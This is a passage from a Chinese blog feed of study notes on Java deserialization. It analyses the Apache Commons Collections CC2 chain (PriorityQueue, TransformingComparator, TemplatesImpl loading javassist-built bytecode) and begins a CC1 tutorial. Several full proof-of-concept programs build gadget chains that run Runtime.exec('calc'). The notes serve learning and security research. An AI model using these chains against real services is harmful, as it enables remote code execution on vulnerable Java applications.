class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(obj);</span><br><span class="line">        queue.add(obj);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个POC我一直爆evil的错 目前还没有解决  没有找到相应的包</p><p>但是整体的代码逻辑和升级思路没问题</p><p><img src="https://bu.dusays.com/2024/06/07/66630a0190d6f.png" alt="image-20240604192911997"></p><h3 id="进化成功"><a href="#进化成功" class="headerlink" title="进化成功"></a>进化成功</h3><p>这里我从新找了一个POC来</p><p>思路是一样的 </p><p>都是通过用了javassist动态构造了我们恶意类的字节码</p><p>再来CC3的思路</p><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC22</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool classPool=ClassPool.getDefault();<span class="comment">//返回默认的类池</span></span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);<span class="comment">//添加AbstractTranslet的搜索路径</span></span><br><span class="line">        CtClass payload=classPool.makeClass(<span class="string">&quot;CommonsCollections22222222222&quot;</span>);<span class="comment">//创建一个新的public类</span></span><br><span class="line"></span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));  <span class="comment">//设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet</span></span><br><span class="line">        payload.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>); <span class="comment">//创建一个空的类初始化，设置构造函数主体为runtime</span></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes=payload.toBytecode();<span class="comment">//转换为byte数组</span></span><br><span class="line"></span><br><span class="line">        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();<span class="comment">//反射创建TemplatesImpl</span></span><br><span class="line">        Field field=templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);<span class="comment">//反射获取templatesImpl的_bytecodes字段</span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">        field.set(templatesImpl,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);<span class="comment">//将templatesImpl上的_bytecodes字段设置为runtime的byte数组</span></span><br><span class="line"></span><br><span class="line">        Field field1=templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);<span class="comment">//反射获取templatesImpl的_name字段</span></span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">        field1.set(templatesImpl,<span class="string">&quot;test&quot;</span>);<span class="comment">//将templatesImpl上的_name字段设置为test</span></span><br><span class="line"></span><br><span class="line">        InvokerTransformer transformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);<span class="comment">//使用TransformingComparator修饰器传入transformer对象</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);<span class="comment">//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</span></span><br><span class="line">        queue.add(<span class="number">1</span>);<span class="comment">//添加数字1插入此优先级队列</span></span><br><span class="line">        queue.add(<span class="number">1</span>);<span class="comment">//添加数字1插入此优先级队列</span></span><br><span class="line">        Field field2=queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);<span class="comment">//获取PriorityQueue的comparator字段</span></span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">        field2.set(queue,comparator);<span class="comment">//设置queue的comparator字段值为comparator</span></span><br><span class="line"></span><br><span class="line">        Field field3=queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);<span class="comment">//获取queue的queue字段</span></span><br><span class="line">        field3.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">        field3.set(queue,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl,templatesImpl&#125;);<span class="comment">//设置queue的queue字段内容Object数组，内容为templatesImpl</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream inputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个POC是没问题的</p><p><img src="https://bu.dusays.com/2024/06/07/66630a0324c69.png" alt="image-20240604193233796"></p><p>我们重新分析一下吧 虽然思路差不多</p><p>这条链子和CC2进化之前的链子有很多地方都是一样的，不过这里 RCE 的方法是利用 <strong>javassist</strong> 中的字节码编程获取到字节码，然后再利用 <strong>TemplatesImpl</strong> 中的 <strong>defineTransletClasses</strong> 方法把字节码加载到 JVM 中运行</p><h4 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h4><p>从 POC 入手</p><p>推反序列化链，<code>readObject</code> 到 <code>siftDownUsingComparator</code> 这一段都是一样的，不过要重新分析一下 <strong>siftDownUsingComparator</strong> 利用的过程</p><p><img src="https://bu.dusays.com/2024/06/07/666309ff551a2.png" alt="image-20240604194627498"></p><p>可以看到在 POC 中通过反射给 <strong>queue 实例</strong>中的 <strong>queue 属性</strong> set 成了我们的恶意类</p><p><img src="https://bu.dusays.com/2024/06/07/666309ff2dece.png" alt="image-20240604195341442"></p><p>我们回头看<code>siftDownUsingComparator</code></p><p>传进这个方法的 k 值为 0，x 值为 queue [0]</p><p><img src="https://bu.dusays.com/2024/06/07/66630a005f046.png" alt="image-20240604200106932"></p><p>下面有一个 &amp;&amp; 短路</p><p>因为 child 为 (k&lt;&lt;1)+1, 所以值为 2, 又因为 size 也为 2，所以你看这里</p><p><img src="https://bu.dusays.com/2024/06/07/666309ff6a009.png" alt="image-20240604200348594"></p><p>即使我们的 c 值，queue [right] 值存在着我们的恶意类，因为 right&#x3D;&#x3D;size&#x3D;2, 所以在这个逻辑中前面就已经为 false 了，所以<strong>后面的 compare 方法是不会执行的</strong>。</p><p>我们其实执行的 compare 方法是在下一个 if 语句</p><p><img src="https://bu.dusays.com/2024/06/07/666309ff35ca3.png" alt="image-20240604200809671"></p><p>我们的debug中也有所体现</p><p>所以 我们的 queue [0] 中必须放着我们的恶意类，其他的放不放无所谓 (即使 c 也可以传进去)</p><p>我们在回头看<code>TransformingComparator.compare</code></p><p><img src="https://bu.dusays.com/2024/06/07/666309ff29cb2.png" alt="image-20240604201700334"></p><p>我们传入的 x 即 queue [0] 是被先执行的，所以如果 queue [0] 中不存在我们的恶意类，后面的 <strong>InvokerTransformer</strong> 就无法执行 <strong>newTransformer</strong> 方法，就会直接抛出错误中断运行 </p><p>至于为什么是数组，因为 queue 是数组嘛</p><p>这也是为什么必须放着我们的恶意类的原因</p><p>好</p><p>然后就是TemplatesImpl加载字节码了</p><p>这里就不索了</p><p>这里是用了javassist动态构造了我们恶意类的字节码，当然也可以直接编译成class文件，然后用二进制字节码来存储</p><p><img src="https://bu.dusays.com/2024/06/07/666309ff676d5.png" alt="image-20240604203301928"></p><p>这里是用ClassPool 和CtClass来生成恶意类的字节码</p><p><img src="https://bu.dusays.com/2024/06/07/66630a01017a8.png" alt="image-20240604203450335"></p><p>我们反射创建TemplatesImpl类，这没什么好说的，反射获取到了TemplatesImpl.instance对象作为TemplatesImpl类的实例化</p><p><img src="https://bu.dusays.com/2024/06/07/666309ff666ae.png" alt="image-20240604203807980"></p><p>通过Field来获取_bytecodes属性，这里调用的getDeclaredField()方法，并设置setAccessible(true);能获取到所有属性包括Privatie的</p><p><img src="https://bu.dusays.com/2024/06/07/66630a0156e78.png" alt="image-20240604204708784"></p><p>获取到_bytecodes属性后把我们生成的恶意类字节码bytes给set赋值到里面去</p><p><img src="https://bu.dusays.com/2024/06/07/666309ff419b5.png" alt="image-20240604204755288"></p><p>想调用到defineTransletClasses()方法就要保证 <strong>_name不为空</strong>,getTransletInstance()用defineTransletClasses()来加载字节码生成类</p><p>并且下面语句实例化恶意类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/06/07/66630a0154b65.png" alt="image-20240604205832076"></p><p>getTransletInstance()会去调用defineTransletClasses()，又会继续调用ClassLoader的defineClass来加载我们的字节码（这到ClassLoader已经底层类加载了）来生成恶意类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">loader.defineClass(_bytecodes[i]);</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/06/07/66630a00b5f57.png" alt="image-20240604210134421"></p><p>所以接下来的poc是设置_name为我们的恶意类名，保证它不为空</p><p><img src="https://bu.dusays.com/2024/06/07/666309ff6a009.png" alt="image-20240604210429456"></p><p><img src="https://bu.dusays.com/2024/06/07/66630a0066009.png" alt="image-20240604210414083"></p><p>通过结构 找到了在TemplatesImpl类中有一个new TransformerImpl()方法内部调用了getTransletInstance()方法能成功调用</p><p><img src="https://bu.dusays.com/2024/06/07/666309ffbbbd8.png" alt="image-20240604211038778"></p><p>那么再来看看这个newTransformerImpl()方法是什么</p><p>它会返回一个<strong>transformer</strong></p><p>然后就是我们的<code>InvokerTransformer</code>类的<code>transform()</code>方法来调用new TransformerImpl()方法</p><p>再就是我们前面所提到的PriorityQueue集合了！</p><p>该队列的comparator属性我们可以指定成TransformingComparator比较器的，这样就可以调用TransformingComparator的compare()方法了</p><p>并且把比较对象设置成TemplatesImpl类的对象</p><p>因此我们只需要在PriorityQueue集合中添加两个TemplatesImpl对象作为集合元素就可以触发之前构造的利用链。</p><p><img src="https://bu.dusays.com/2024/06/07/66630a0017ed2.png" alt="image-20240604211509209"></p><p>当然 是先实例化一个PrioritQueue对象，我们可控comparator属性，填入的两个元素</p><p>然后设置comparator的属性，通过Field获取到对应的属性，然后传入comparator和queue属性</p><p>注意这里因为是比较队列至少需要两个元素，所以我们传入两个TemplatesImpl_instance对象</p><p><img src="https://bu.dusays.com/2024/06/07/66630a005d710.png" alt="image-20240604211658969"></p><p>接下来就是熟悉的序列化再反序列化出来了也就是模拟一边数据传输流了</p><p><img src="https://bu.dusays.com/2024/06/07/666309ffd2e64.png" alt="image-20240604211726045"></p><p>分析就差不多这样</p><p>可能这个POC更好理解一点</p><p>注释不那辣莫多 更清晰一点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//构造恶意类TestTemplatesImpl并转换为字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;cc2.TestTemplatesImpl&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        System.out.println(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射创建TemplatesImpl</span></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">TemplatesImpl_instance</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将恶意类的字节码设置给_bytecodes属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(TemplatesImpl_instance, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置属性_name为恶意类名</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(TemplatesImpl_instance, <span class="string">&quot;TestTemplatesImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造利用链</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformer_comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置comparator属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(queue, transformer_comparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置queue属性</span></span><br><span class="line">        field = queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//队列至少需要2个元素</span></span><br><span class="line">        Object[] objects = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TemplatesImpl_instance, TemplatesImpl_instance&#125;;</span><br><span class="line">        field.set(queue, objects);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化 ---&gt; 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：</p><p>PriorityQueue的利用链是否支持在Commons-Collections&#x3D;3中使⽤</p><p>当然不行因为这条利用链中的关键类 <code>org.apache.commons.collections4.comparators.TransformingComparator</code> ，在Commons-Collections&#x3D;4.0以前是版本中是<strong>没有实现 Serializable 接口的</strong></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> java </tag>
            
            <tag> 学习 </tag>
            
            <tag> CC链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化--CC1</title>
      <link href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1/"/>
      <url>/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1/</url>
      
        <content type="html"><![CDATA[<h1 id="java反序列化–CC1"><a href="#java反序列化–CC1" class="headerlink" title="java反序列化–CC1"></a>java反序列化–CC1</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><ul><li>Apache Commons Collections是Apache软件基金会的一个项目，它提供了一组扩展了Java标准库中Collection结构的类和方法。这些类和方法被广泛用于各种Java应用的开发中。</li><li>CC1链是Apache Commons Collections库中反序列化漏洞的利用链的简称。反序列化是将字节序列恢复成对象的过程，如果在这个过程中输入了不可信的数据，就有可能触发包含在序列化参数中的恶意代码。</li></ul><p>所以</p><p>Apache Commons Collections它提供了很多强大的数据结构类型和实现了各种集合工具类。作为Apache开放项目的重要组件，Commons Collections被广泛的各种Java应用的开发，而正是因为在⼤量web应⽤程序中这些类的实现以及⽅法的调⽤，导致了反序列化⽤漏洞的普遍性和严重性。。</p><p>commons-collections组件反序列化漏洞的反射链也称为CC链，自从apache commons-collections组件爆出第一个java反序列化漏洞后，就像打开了java安全的新世界大门一样，之后很多java中间件相继都爆出反序列化漏洞。</p><h3 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h3><p>Maven 是一个<strong>项目管理工具</strong>，它包含了一个项目对象模、型 (POM： Project Object Model)，一组标准集合，一个项目生命周期(Project Lifecycle)，一个依赖管理系统(Dependency Management System)，和用来运行定义在生命周期阶段(phase)中插件(plugin)目标(goal)的逻辑</p><p>作用：</p><ul><li>省去jar包的导入，而是坐标来进行导入，减少了项目的内存大小</li><li>更加方便的构建项目，实现项目的一键构建。指的是项目从编译、测试、运行、打包、安装 ，部署整个过程都交给 maven 进行管理，这个过程称为构建</li></ul><p>在cc链分析中</p><p>我们需要通过maven<strong>添加依赖</strong>：在项目的<code>pom.xml</code>文件中加入Apache Commons Collections的依赖项：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>首先是我们要注意java的版本需要是第一点的 ，因为一些漏洞后续被修复了</p><p>我原来的版本是8u401</p><p>这里我们需要8u65 版本低点</p><p>具体<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">下载</a>这里就不赘述了</p><p>因为一些源码是class文件，工具会帮我们自动反编译的，但是我们都知道，这个东西反编译出来的，肯定不方便阅读，所以为了方便我们后续的调试，我们这里将<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">openjdk</a>的源码下过来，把我们需要导入到jdk中</p><p>这里我们来到jdk的目录中 在我们的jdk中有一个src.zip 解压到当前文件夹</p><p><img src="https://bu.dusays.com/2024/06/07/666309a68f681.png" alt="image-20240527130414009"></p><p>在我们下载的Openjdk中有个sun文件</p><p><img src="https://bu.dusays.com/2024/06/07/666309a60e501.png" alt="image-20240527130614217"></p><p>将sun粘贴到jdk的解压的src目录里面</p><p><img src="https://bu.dusays.com/2024/06/07/666309a5b054a.png" alt="image-20240527130712319"></p><p>好 打开idea换sdk(结构目录中)</p><p>选择我们需要的jdk，然后选择源路径，把src文件夹添加进去</p><p><img src="https://bu.dusays.com/2024/06/07/666309a5b308b.png" alt="image-20240527130952197"></p><p>我们新建项目选择maven</p><p><img src="https://bu.dusays.com/2024/06/07/666309a59616d.png" alt="image-20240527131442362"></p><p>新建maven就是这样的</p><p><img src="https://bu.dusays.com/2024/06/07/666309a63ccd9.png" alt="image-20240527131515973"></p><p>然后再pom.xmli添加我们上面说的maven依赖</p><p>这个也是一样的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/06/07/666309a67218a.png" alt="image-20240527131656082"></p><p>这里我们右键pom.xml -&gt; maven然后按下面的来</p><p><img src="https://bu.dusays.com/2024/06/07/666309a7ea7ac.png" alt="image-20240527131747576"></p><p>已经下载了依赖</p><p><img src="https://bu.dusays.com/2024/06/07/666309a590a7a.png" alt="image-20240527132040566"></p><h3 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h3><ul><li>java 版本 &lt; 8u71</li><li>CommonCollections&lt;&#x3D;3.2.1</li><li>有 common-collentions 依赖</li></ul><h2 id="简化cc1-demo分析"><a href="#简化cc1-demo分析" class="headerlink" title="简化cc1-demo分析"></a>简化cc1-demo分析</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>这段demo去掉了CC链的反射部分并进行了简化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;) <span class="comment">// Windows下的计算器命令，根据实际情况调整</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 触发执行链</span></span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运⾏就会发现弹出了计算器</p><p><img src="https://bu.dusays.com/2024/06/07/666309a87ea23.png" alt="image-20240527151926187"></p><p>如大家所见</p><p>这里面涉及到了几个类与接口</p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p><img src="https://bu.dusays.com/2024/06/07/666309a5de634.png" alt="image-20240527152849189"></p><p>TransformedMap用于对Java<strong>标准数据结构Map</strong>做⼀个<strong>修饰</strong>，被修饰过的Map在添加新的元素时，将可以执行⼀个<strong>回调</strong>。我们通过以上这行代码对innerMap进行修饰，传出的outerMap即是修饰后的Map</p><p>也就是：</p><figure class="highlight java"><table><tr><td class="code"><pre><span 